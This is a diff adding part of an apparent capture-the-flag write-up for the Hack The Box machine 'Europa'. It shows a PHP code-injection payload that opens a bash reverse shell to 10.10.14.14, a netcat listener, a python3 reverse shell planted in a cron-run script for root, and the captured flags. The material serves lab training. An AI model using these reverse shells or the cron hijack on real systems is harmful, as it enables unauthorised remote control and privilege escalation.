@@ -78,3 +78,48 @@ Passing the -e paramteter to the function will let us execute the replacements t
 
 ![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/burp_info.png "phpinfo")
 
+So lets put our payload in the text parameter which is as follows:
+
+```
+system("/bin/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.14/12345%200>%261'");
+```
+And send it while listening with netcat on port 12345
+```
+nc -nvlp 12345
+```
+![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/shell.png "shell")
+
+Perfect we got shell! We can find the user flag at /home/john/user.txt
+
+```
+2f8d40cc05295154a9c3452c19ddc221
+```
+Alright our next step is priv esc. 
+There seems to be a directory called cronjobs lets see what is inside..
+
+```
+/var/www/cronjobs$ cat clearlogs
+cat clearlogs
+#!/usr/bin/php
+<?php
+$file = '/var/www/admin/logs/access.log';
+file_put_contents($file, '');
+exec('/var/www/cmd/logcleared.sh');
+?>
+```
+So apparently this script gets calles another script located at /var/www/cmd/logcleared.sh every minute, lets see if we can make it spawn another reverse shell with python3.
+
+So I created a logcleared.sh with containing this code:
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",12346));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+and did
+```
+chmod 777 logcleared.sh
+```
+After waiting a minute listening with netcat on port 12346 we got another reverse shell with root privileges. 
+Now simply cat the root.txt at /root/ et voilà :
+```
+7f19438b27578e4fcc8bef3a029af5a5
+```
